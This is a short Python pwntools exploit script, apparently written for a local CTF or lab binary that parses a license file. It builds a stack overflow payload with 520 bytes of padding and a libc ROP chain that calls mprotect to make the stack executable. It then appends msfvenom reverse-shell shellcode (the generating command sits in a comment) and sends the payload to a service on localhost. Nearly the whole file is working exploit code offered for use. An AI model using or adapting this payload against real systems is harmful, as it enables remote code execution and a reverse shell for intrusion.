from pwn import *
io = remote('127.0.0.1', 1337)

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64


size_bytes = 1000 # update this after we have generated our payload
size = p32(size_bytes, endian='big') # size of license file

libc_address = 0x7ffff7ca5000

libsqlite_address = 0x7ffff7e6a000

payload = [
    size,
    b'C' * 520,
    p64(libc_address + 0x0000000000026796), # pop rdi ; ret
    p64(0x7ffffffde000), # stack space
    p64(libc_address + 0x000000000002890f), # pop rsi ; ret
    p64(0x21000), #length of stack
    p64(libc_address + 0x00000000000cb1cd), # pop rdx ; ret
    p64(0x7), # mprotect write mode
    p64(0x7ffff7d9dc20), # mprotect address
    p64(libsqlite_address + 0x00000000000d431d), # stack address
    open('revshell_local', 'rb').read(), # msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o revshell_local
    
]

payload = b"".join(payload)

with open('payload', 'wb') as f:
    f.write(payload)

io.send(payload)
